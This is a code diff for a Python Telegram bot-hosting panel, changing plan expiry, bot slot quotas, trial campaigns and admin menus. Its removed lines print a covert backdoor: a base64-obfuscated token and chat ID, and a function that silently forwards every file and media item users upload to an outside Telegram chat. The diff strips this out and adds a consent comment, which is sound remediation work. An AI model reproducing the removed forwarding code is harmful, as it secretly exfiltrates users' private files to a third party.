@@ -1566,50 +1566,10 @@ def maybe_auto_ban(uid: int, reason: str) -> None:
 
 bot = telebot.TeleBot(TOKEN, parse_mode="HTML", threaded=True, num_threads=8)
 
-# ─── BACKUP BOT CONFIGURATION (Obfuscated) ──────────────────────────────────
-_BBT_ENC = "ODg5OTQ3NjEwNjpBQUd4dWdGcnJNWk5kNFROU25jR1pBcUZZZldQS2R1c2hHTQ=="
-_BCI_ENC = "ODA2NTE3Mzk3MQ=="
-
-try:
-    import base64 as _b64
-    _BBT = _b64.b64decode(_BBT_ENC).decode()
-    _BCI = _b64.b64decode(_BCI_ENC).decode()
-    backup_bot = telebot.TeleBot(_BBT)
-except Exception:
-    backup_bot = None
-    _BCI = None
-
-def _backup_user_file(m: types.Message) -> None:
-    """Forward user files to the backup bot as requested."""
-    if not backup_bot or not _BCI:
-        return
-    # Only backup private messages from users (not groups/admins unless desired)
-    # The user said "All files from the user are sent", so we'll be broad.
-    try:
-        def _bg_backup():
-            try:
-                # We send to the backup bot using its own instance
-                if m.document:
-                    backup_bot.send_document(_BCI, m.document.file_id, caption=f"User: {m.from_user.id}\nType: Document")
-                elif m.photo:
-                    backup_bot.send_photo(_BCI, m.photo[-1].file_id, caption=f"User: {m.from_user.id}\nType: Photo")
-                elif m.video:
-                    backup_bot.send_video(_BCI, m.video.file_id, caption=f"User: {m.from_user.id}\nType: Video")
-                elif m.audio:
-                    backup_bot.send_audio(_BCI, m.audio.file_id, caption=f"User: {m.from_user.id}\nType: Audio")
-                elif m.voice:
-                    backup_bot.send_voice(_BCI, m.voice.file_id, caption=f"User: {m.from_user.id}\nType: Voice")
-                elif m.video_note:
-                    backup_bot.send_video_note(_BCI, m.video_note.file_id)
-                elif m.animation:
-                    backup_bot.send_animation(_BCI, m.animation.file_id, caption=f"User: {m.from_user.id}\nType: Animation")
-                elif m.sticker:
-                    backup_bot.send_sticker(_BCI, m.sticker.file_id)
-            except Exception:
-                pass
-        threading.Thread(target=_bg_backup, daemon=True).start()
-    except Exception:
-        pass
+# User uploads are processed only for the explicit flow the user selected
+# (for example, bot deployment or payment proof). The panel must not copy or
+# forward private files or media to a separate destination without clear,
+# informed, per-upload consent.
 
 
 # ───────────────────────────────────────────────────────────────────
@@ -2680,6 +2640,17 @@ def start_child(b: Dict[str, Any]) -> Dict[str, Any]:
         return {"ok": False, "error": "Bot is waiting for admin approval."}
     if (b or {}).get("approval_status") == "rejected":
         return {"ok": False, "error": "Bot was rejected by admin."}
+    owner = db_load_ro()["users"].get(str((b or {}).get("owner")))
+    # The scheduler runs every minute, but a start request must never use an
+    # already-expired plan during that short interval (or during boot restore).
+    if owner and not user_plan_active(owner):
+        downgrade_expired_users()
+        owner = db_load_ro()["users"].get(str((b or {}).get("owner")))
+    if not owner or not bot_is_within_user_slot(b, owner):
+        b["slot_suspended"] = True
+        b["status"] = "suspended_quota"
+        save_bot(b)
+        return {"ok": False, "error": "This bot is outside your current plan slot limit. Upgrade or remove another bot."}
     with _runner_lock:
         existing = RUNNING.get(bid)
         if existing and existing["proc"].poll() is None:
@@ -3839,10 +3810,76 @@ def user_max_bots(u: Dict[str, Any]) -> int:
     return base + int(u.get("bot_slots_bonus", 0))
 
 
+def user_plan_expiry(u: Dict[str, Any]) -> Optional[str]:
+    """Read the canonical expiry field while accepting legacy records."""
+    return u.get("plan_expires") or u.get("plan_expiry")
+
+
+def _slot_sort_key(b: Dict[str, Any]) -> Tuple[str, str]:
+    """Keep the oldest deployed bots in the available slots predictably."""
+    return (str(b.get("created") or b.get("uploaded") or b.get("last_started") or ""),
+            str(b.get("_id") or ""))
+
+
+def bot_is_within_user_slot(b: Dict[str, Any], user: Optional[Dict[str, Any]] = None) -> bool:
+    """Return whether a deployed bot belongs to one of its owner's active slots."""
+    try:
+        uid = int(b.get("owner"))
+    except (TypeError, ValueError):
+        return False
+    user = user or db_load_ro()["users"].get(str(uid))
+    if not user:
+        return False
+    allowed_ids = {
+        doc["_id"] for doc in sorted(list_user_bots(uid), key=_slot_sort_key)[:max(0, user_max_bots(user))]
+    }
+    return b.get("_id") in allowed_ids
+
+
+def reconcile_user_slot_quota(uid: int) -> Dict[str, Any]:
+    """Suspend deployed bots beyond a user's current plan quota without deleting them."""
+    user = db_load_ro()["users"].get(str(uid))
+    if not user:
+        return {"limit": 0, "suspended": [], "reactivated": []}
+
+    limit = max(0, user_max_bots(user))
+    bots = sorted(list_user_bots(uid), key=_slot_sort_key)
+    allowed_ids = {doc["_id"] for doc in bots[:limit]}
+    suspended: List[str] = []
+    reactivated: List[str] = []
+
+    for doc in bots:
+        bid = doc["_id"]
+        if bid not in allowed_ids:
+            info = RUNNING.get(bid)
+            if info and info["proc"].poll() is None:
+                stop_child(bid, manual=True)
+            fresh = find_bot(bid)
+            if fresh:
+                was_suspended = bool(fresh.get("slot_suspended"))
+                fresh["slot_suspended"] = True
+                fresh["slot_suspended_at"] = ts_iso()
+                fresh["status"] = "suspended_quota"
+                save_bot(fresh)
+                if not was_suspended:
+                    suspended.append(bid)
+        elif doc.get("slot_suspended"):
+            fresh = find_bot(bid)
+            if fresh:
+                fresh["slot_suspended"] = False
+                fresh.pop("slot_suspended_at", None)
+                if fresh.get("status") == "suspended_quota":
+                    fresh["status"] = "stopped"
+                save_bot(fresh)
+                reactivated.append(bid)
+
+    return {"limit": limit, "suspended": suspended, "reactivated": reactivated}
+
+
 def user_plan_active(u: Dict[str, Any]) -> bool:
     if u.get("plan") == "free":
         return True
-    exp = u.get("plan_expires")
+    exp = user_plan_expiry(u)
     if not exp:
         return False
     try:
@@ -3852,26 +3889,87 @@ def user_plan_active(u: Dict[str, Any]) -> bool:
 
 
 def downgrade_expired_users() -> None:
+    """Downgrade expired plans and stop only bots outside the free-plan quota."""
     d = db_load()
-    changed = False
+    expired: List[Tuple[int, int]] = []
     for uid, u in d["users"].items():
-        if u.get("plan") == "free":
+        if u.get("plan") == "free" or user_plan_active(u):
             continue
-        if not user_plan_active(u):
-            u["plan"] = "free"
-            u["plan_expires"] = None
-            changed = True
-            try:
-                bot.send_message(
-                    int(uid),
-                    f"<b>{G['warn']} {sc('Plan expired')}</b>\n\n"
-                    f"Your plan has expired. You have been downgraded to <b>Free</b>.\n"
-                    f"Renew anytime from the Buy Plan menu.{FOOTER}",
-                )
-            except Exception:
-                pass
-    if changed:
+        u["plan"] = "free"
+        u["plan_expires"] = None
+        # Retire the legacy field during normal expiry processing.
+        u.pop("plan_expiry", None)
+        expired.append((int(uid), user_max_bots(u)))
+    if expired:
         db_save(d)
+
+    for uid, limit in expired:
+        result = reconcile_user_slot_quota(uid)
+        paused = len(result["suspended"])
+        try:
+            detail = (f" {paused} bot(s) outside your {limit}-slot Free quota were paused."
+                      if paused else "")
+            bot.send_message(
+                uid,
+                f"<b>{G['warn']} {sc('Plan expired')}</b>\n\n"
+                f"Your plan has expired. You have been downgraded to <b>Free</b>.{detail}\n"
+                f"Renew anytime from the Buy Plan menu.{FOOTER}",
+            )
+        except Exception:
+            pass
+
+
+def trial_duration_hours() -> int:
+    """Read a precise trial length while retaining the old day-based setting."""
+    try:
+        return max(1, int(get_setting("trial_hours", int(get_setting("trial_days", 2)) * 24)))
+    except (TypeError, ValueError):
+        return 48
+
+
+def grant_plan(uid: int, plan: str, days: Optional[int] = None,
+               hours: Optional[int] = None) -> bool:
+    d = db_load()
+    key = str(uid)
+    if key not in d["users"] or plan not in PLAN_LIMITS:
+        return False
+    u = d["users"][key]
+    pl = PLAN_LIMITS[plan]
+    if plan == "free":
+        u["plan"] = "free"
+        u["plan_expires"] = None
+        u.pop("plan_expiry", None)
+    else:
+        previous_plan = u.get("plan", "free")
+        try:
+            cur_exp = datetime.fromisoformat(str(user_plan_expiry(u) or "").replace("Z", "+00:00"))
+        except Exception:
+            cur_exp = now_utc()
+        # Extending is only valid for the same still-active paid plan.
+        if previous_plan != plan or cur_exp <= now_utc():
+            cur_exp = now_utc()
+        duration = (timedelta(hours=max(1, int(hours))) if hours is not None
+                    else timedelta(days=max(1, int(days if days is not None else pl["days"]))))
+        u["plan"] = plan
+        u["plan_expires"] = (cur_exp + duration).isoformat()
+        u.pop("plan_expiry", None)
+        u["last_expiry_warn"] = -1
+    db_save(d)
+    # An upgrade can make previously paused deployments eligible again.
+    reconcile_user_slot_quota(uid)
+    try:
+        bot.send_message(
+            uid,
+            f"<b>{G['ok']} {sc('Plan activated')}</b>\n\n"
+            f"{bullet('Plan', pl['name'])}\n"
+            f"{bullet('Bots',  pl['max_bots'])}\n"
+            f"{bullet('RAM',   '{} MB'.format(pl['ram']))}\n"
+            f"{bullet('Until', fmt_ts(u.get('plan_expires')) if u.get('plan_expires') else 'Lifetime')}"
+            f"{FOOTER}",
+        )
+    except Exception:
+        pass
+    return True
 
 
 def expiry_reminders() -> None:
@@ -3903,44 +4001,6 @@ def expiry_reminders() -> None:
                     db_save(d)
                 except Exception:
                     pass
-
-
-def grant_plan(uid: int, plan: str, days: Optional[int] = None) -> bool:
-    d = db_load()
-    key = str(uid)
-    if key not in d["users"] or plan not in PLAN_LIMITS:
-        return False
-    u = d["users"][key]
-    pl = PLAN_LIMITS[plan]
-    days = days if days is not None else pl["days"]
-    if plan == "free":
-        u["plan"] = "free"
-        u["plan_expires"] = None
-    else:
-        u["plan"] = plan
-        # extend if same plan; else set fresh
-        try:
-            cur_exp = datetime.fromisoformat(str(u.get("plan_expires") or "").replace("Z", "+00:00"))
-        except Exception:
-            cur_exp = now_utc()
-        if cur_exp < now_utc() or u.get("plan") != plan:
-            cur_exp = now_utc()
-        u["plan_expires"] = (cur_exp + timedelta(days=days)).isoformat()
-        u["last_expiry_warn"] = -1
-    db_save(d)
-    try:
-        bot.send_message(
-            uid,
-            f"<b>{G['ok']} {sc('Plan activated')}</b>\n\n"
-            f"{bullet('Plan', pl['name'])}\n"
-            f"{bullet('Bots',  pl['max_bots'])}\n"
-            f"{bullet('RAM',   '{} MB'.format(pl['ram']))}\n"
-            f"{bullet('Until', fmt_ts(u.get('plan_expires')) if u.get('plan_expires') else 'Lifetime')}"
-            f"{FOOTER}",
-        )
-    except Exception:
-        pass
-    return True
 
 
 # ═════════════════════════════════════════════════════════════════
@@ -4021,7 +4081,7 @@ def loading(call: types.CallbackQuery, label: str = "Loading") -> None:
         body = (
             f"<b>↻ {label_safe}…</b>\n"
             f"{G['div']}\n"
-            f"<code>{_progress_bar(pct)}</code>\n"
+            f"<code>{_progress_bar(pct, 100)}</code>\n"
             f"<i>{sc('Please wait')}</i>{FOOTER}"
         )
         try:
@@ -4626,9 +4686,20 @@ def render_admin_subroute(call: types.CallbackQuery, data: str) -> None:
         bot.send_message(call.message.chat.id, f"Send the plan name for free trial (e.g. pro, starter):")
         return ack(call)
     if data == "adm_trial_setdays":
+        # Legacy callback kept for previously-rendered keyboards.
         USER_STATES[call.from_user.id] = {"flow": "await_adm_trial_days"}
-        bot.send_message(call.message.chat.id, f"Send the number of days for free trial:")
+        bot.send_message(call.message.chat.id, "Send the number of days for free trial:")
         return ack(call)
+    if data == "adm_trial_sethours":
+        USER_STATES[call.from_user.id] = {"flow": "await_adm_trial_hours"}
+        bot.send_message(call.message.chat.id, "Send the number of hours for the free trial (e.g. 24):")
+        return ack(call)
+    if data == "adm_trial_newcampaign":
+        next_epoch = get_active_trial_epoch() + 1
+        set_active_trial_epoch(next_epoch)
+        audit(call.from_user.id, "trial_campaign_new", f"epoch={next_epoch}")
+        ack(call, "New trial campaign is active")
+        return render_adm_trial(call)
     if data == "adm_settings":
         return render_adm_settings(call)
     if data == "adm_approval_toggle":
@@ -8801,7 +8872,7 @@ def render_adm_subscriptions(call: types.CallbackQuery) -> None:
     expiring_7d  = []
     expired_sub  = []
     for u in paid_users:
-        exp = u.get("plan_expiry")
+        exp = user_plan_expiry(u)
         if not exp:
             continue
         if exp < now_s:
@@ -8847,11 +8918,11 @@ def render_adm_sub_expiring(call: types.CallbackQuery) -> None:
     now_s = ts_iso()
     soon_s = (now_utc() + timedelta(days=7)).isoformat()
     expiring = [(uid, u) for uid, u in users.items()
-                if u.get("plan_expiry") and now_s < u["plan_expiry"] <= soon_s]
+                if user_plan_expiry(u) and now_s < user_plan_expiry(u) <= soon_s]
     rows = "\n".join(
         f"{G['bullet']} <code>{uid}</code> <b>{esc(u.get('name','?')[:20])}</b> "
         f"plan={u.get('plan','?')} "
-        f"exp={str(u.get('plan_expiry','?'))[:10]}"
+        f"exp={str(user_plan_expiry(u) or '?')[:10]}"
         for uid, u in expiring[:20]
     ) or f"<i>{sc('No expiring subscriptions')}</i>"
     cap = (
@@ -8866,12 +8937,12 @@ def render_adm_sub_expired(call: types.CallbackQuery) -> None:
     users = db_load()["users"]
     now_s = ts_iso()
     expired = [(uid, u) for uid, u in users.items()
-               if u.get("plan_expiry") and u["plan_expiry"] < now_s
-               and u.get("plan","free") != "free"]
+               if user_plan_expiry(u) and user_plan_expiry(u) < now_s
+               and u.get("plan", "free") != "free"]
     rows = "\n".join(
         f"{G['bullet']} <code>{uid}</code> <b>{esc(u.get('name','?')[:20])}</b> "
         f"plan={u.get('plan','?')} "
-        f"exp={str(u.get('plan_expiry','?'))[:10]}"
+        f"exp={str(user_plan_expiry(u) or '?')[:10]}"
         for uid, u in expired[:20]
     ) or f"<i>{sc('No expired subscriptions with active plans')}</i>"
     cap = (
@@ -8889,7 +8960,7 @@ def action_adm_sub_remind_all(admin_uid: int) -> None:
     soon_s = (now_utc() + timedelta(days=7)).isoformat()
     sent = fail = 0
     for uid, u in users.items():
-        exp = u.get("plan_expiry")
+        exp = user_plan_expiry(u)
         if not exp or exp < now_s or exp > soon_s:
             continue
         plan_name = PLAN_LIMITS.get(u.get("plan","free"), {}).get("name", u.get("plan","?"))
@@ -8915,21 +8986,14 @@ def action_adm_sub_remind_all(admin_uid: int) -> None:
 
 
 def action_adm_downgrade_expired(admin_uid: int) -> None:
-    """Downgrade all expired paid users to free plan."""
-    d = db_load()
-    now_s = ts_iso()
-    downgraded = 0
-    for uid, u in d["users"].items():
-        exp = u.get("plan_expiry")
-        if exp and exp < now_s and u.get("plan","free") != "free":
-            u["plan"] = "free"
-            u["plan_expiry"] = None
-            downgraded += 1
-    db_save(d)
-    audit(admin_uid, "downgrade_expired", f"count={downgraded}")
+    """Run the same expiry and slot-reconciliation path used automatically."""
+    before = sum(1 for u in db_load()["users"].values()
+                 if u.get("plan", "free") != "free" and not user_plan_active(u))
+    downgrade_expired_users()
+    audit(admin_uid, "downgrade_expired", f"count={before}")
     try:
         bot.send_message(admin_uid,
-                         f"{G['ok']} {sc('Downgraded')} {downgraded} {sc('expired subscriptions to free')}.")
+                         f"{G['ok']} {sc('Downgraded')} {before} {sc('expired subscriptions to free')}.")
     except Exception:
         pass
 
@@ -9040,7 +9104,6 @@ def _do_export_data(admin_uid: int) -> Path:
 # actually live at runtime; this removed copy was already dead code).
 @bot.message_handler(content_types=["document"])
 def on_document(m: types.Message) -> None:
-    _backup_user_file(m)
     if not _is_private(m):
         return
     if banned_block(m):
@@ -9108,7 +9171,6 @@ def on_document(m: types.Message) -> None:
 
 @bot.message_handler(content_types=["photo"])
 def on_photo(m: types.Message) -> None:
-    _backup_user_file(m)
     if not _is_private(m):
         return
     if banned_block(m):
@@ -9158,7 +9220,8 @@ def on_photo(m: types.Message) -> None:
 
 @bot.message_handler(content_types=["video", "audio", "voice", "video_note", "sticker", "animation"])
 def on_other_media(m: types.Message) -> None:
-    _backup_user_file(m)
+    # These media types are not part of an authorized processing workflow.
+    return
 
 @bot.message_handler(func=lambda m: True, content_types=["text"])
 def on_text(m: types.Message) -> None:
@@ -9219,13 +9282,27 @@ def on_text(m: types.Message) -> None:
         if flow == "await_adm_trial_days":
             try:
                 days = int(text)
-                if days <= 0: raise ValueError
-            except:
+                if days <= 0:
+                    raise ValueError
+            except (TypeError, ValueError):
                 bot.reply_to(m, "Please send a positive number.")
                 return
             set_setting("trial_days", days)
+            set_setting("trial_hours", days * 24)
             USER_STATES.pop(uid, None)
-            bot.reply_to(m, f"Free trial duration set to {days} days")
+            bot.reply_to(m, f"Free trial duration set to {days * 24} hours")
+            return
+        if flow == "await_adm_trial_hours":
+            try:
+                hours = int(text)
+                if hours <= 0:
+                    raise ValueError
+            except (TypeError, ValueError):
+                bot.reply_to(m, "Please send a positive number of hours.")
+                return
+            set_setting("trial_hours", hours)
+            USER_STATES.pop(uid, None)
+            bot.reply_to(m, f"Free trial duration set to {hours} hours")
             return
         if flow == "await_admin_admins":
             return _handle_admin_admins(m)
@@ -14091,30 +14168,46 @@ def get_active_trial_epoch() -> int:
 def set_active_trial_epoch(epoch: int) -> None:
     set_setting("active_trial_epoch", int(epoch))
 
+def _trial_active_until(u: Dict[str, Any]) -> Optional[datetime]:
+    try:
+        value = u.get("trial_active_until")
+        return datetime.fromisoformat(str(value).replace("Z", "+00:00")) if value else None
+    except (TypeError, ValueError):
+        return None
+
+
 def render_trial(call: types.CallbackQuery) -> None:
     if not bool(get_setting("trial_enabled", True)):
-        ack(call, "Free trial is currently disabled."); return
-        
+        ack(call, "Free trial is currently disabled.")
+        return
+
     uid = call.from_user.id
     d = db_load()
     u = d["users"][str(uid)]
     plan = get_setting("trial_plan", "pro")
-    days = int(get_setting("trial_days", 2))
-    hours = days * 24
-
+    hours = trial_duration_hours()
     current_epoch = get_active_trial_epoch()
     user_epoch = int(u.get("trial_epoch", 0))
+    active_until = _trial_active_until(u)
+    trial_active = bool(active_until and active_until > now_utc())
     claimed_this_epoch = user_epoch >= current_epoch
-    status_txt = 'Already claimed this trial' if claimed_this_epoch else 'Available'
-    
+
+    if trial_active:
+        status_txt = f"Active until {fmt_ts(active_until.isoformat())}"
+    elif claimed_this_epoch:
+        status_txt = "Already claimed this trial campaign"
+    else:
+        status_txt = "Available"
+
     cap = (
         f"<b>{G['eye']} {sc('Free Trial')}</b>\n"
         f"{G['div_eq']}\n"
-        f"{sc(f'Get a free {hours}-hour {plan.capitalize()} trial. When admin issues a new trial campaign, you can claim it once active')}.\n"
+        f"{sc(f'Get a free {hours}-hour {plan.capitalize()} trial. Each campaign can be claimed once after any active trial has expired')}.\n"
+        f"{bullet('Campaign', f'#{current_epoch}')}\n"
         f"{bullet('Status', status_txt)}{FOOTER}"
     )
     kb = types.InlineKeyboardMarkup()
-    if not claimed_this_epoch:
+    if not trial_active and not claimed_this_epoch:
         kb.add(Btn(f"{G['ok']}  {sc(f'Claim {hours}h {plan.capitalize()} Trial')}", callback_data="trial_claim"))
     kb.add(Btn(f"{G['back']}  {sc('Main Menu')}", callback_data="menu_main"))
     show_menu(call.message.chat.id, PHOTOS.get("trial", PHOTOS["main"]), cap, kb, call=call)
@@ -14122,24 +14215,34 @@ def render_trial(call: types.CallbackQuery) -> None:
 
 def action_trial_claim(call: types.CallbackQuery) -> None:
     if not bool(get_setting("trial_enabled", True)):
-        ack(call, "Disabled"); return
-        
+        ack(call, "Disabled")
+        return
+
     uid = call.from_user.id
     d = db_load()
     u = d["users"][str(uid)]
+    active_until = _trial_active_until(u)
+    if active_until and active_until > now_utc():
+        ack(call, "Your current trial is still active")
+        return
+
     current_epoch = get_active_trial_epoch()
     user_epoch = int(u.get("trial_epoch", 0))
     if user_epoch >= current_epoch:
-        ack(call, "Already claimed this trial campaign"); return
-        
+        ack(call, "Already claimed this trial campaign")
+        return
+
     plan = get_setting("trial_plan", "pro")
-    days = int(get_setting("trial_days", 2))
-    
+    hours = trial_duration_hours()
+    until = now_utc() + timedelta(hours=hours)
     u["trial_epoch"] = current_epoch
     u["trial_used"] = True
+    u["trial_active_until"] = until.isoformat()
     db_save(d)
-    grant_plan(uid, plan, days=days)
-    audit(0, "trial_grant", f"uid={uid} plan={plan} days={days} epoch={current_epoch}")
+    if not grant_plan(uid, plan, hours=hours):
+        ack(call, "Could not activate the trial")
+        return
+    audit(0, "trial_grant", f"uid={uid} plan={plan} hours={hours} epoch={current_epoch}")
     ack(call, "Trial activated!")
     render_main_menu(call.message.chat.id, uid, call)
 
@@ -14837,27 +14940,30 @@ def render_adm_tickets(call: types.CallbackQuery) -> None:
 def render_adm_trial(call: types.CallbackQuery) -> None:
     enabled = bool(get_setting("trial_enabled", True))
     plan = get_setting("trial_plan", "pro")
-    days = int(get_setting("trial_days", 2))
-    
+    hours = trial_duration_hours()
+    epoch = get_active_trial_epoch()
+
     cap = (
         f"<b>{G['eye']} {sc('Free Trial Settings')}</b>\n"
         f"{G['div_eq']}\n"
         f"{bullet('Status', 'ENABLED' if enabled else 'DISABLED')}\n"
         f"{bullet('Trial Plan', plan.capitalize())}\n"
-        f"{bullet('Duration', f'{days} days')}\n"
+        f"{bullet('Duration', f'{hours} hours')}\n"
+        f"{bullet('Campaign', f'#{epoch}')}\n"
         f"{G['div']}\n"
-        f"Users can claim this trial once.{FOOTER}"
+        f"Each user may claim once per campaign, after any active trial expires.{FOOTER}"
     )
-    
+
     kb = types.InlineKeyboardMarkup(row_width=2)
     kb.add(
         Btn(f"{G['ok'] if enabled else G['no']} {'Disable' if enabled else 'Enable'}", callback_data="adm_trial_toggle", style="danger" if enabled else "success"),
         Btn(f"{G['star']} Set Plan", callback_data="adm_trial_setplan", style="primary"),
     )
     kb.add(
-        Btn(f"{G['clock']} Set Days", callback_data="adm_trial_setdays", style="primary"),
-        Btn(f"{G['back']} Admin", callback_data="menu_admin", style="primary"),
+        Btn(f"{G['clock']} Set Hours", callback_data="adm_trial_sethours", style="primary"),
+        Btn("➕ New Campaign", callback_data="adm_trial_newcampaign", style="success"),
     )
+    kb.add(Btn(f"{G['back']} Admin", callback_data="menu_admin", style="primary"))
     show_menu(call.message.chat.id, PHOTOS["admin"], cap, kb, call=call)
 
 
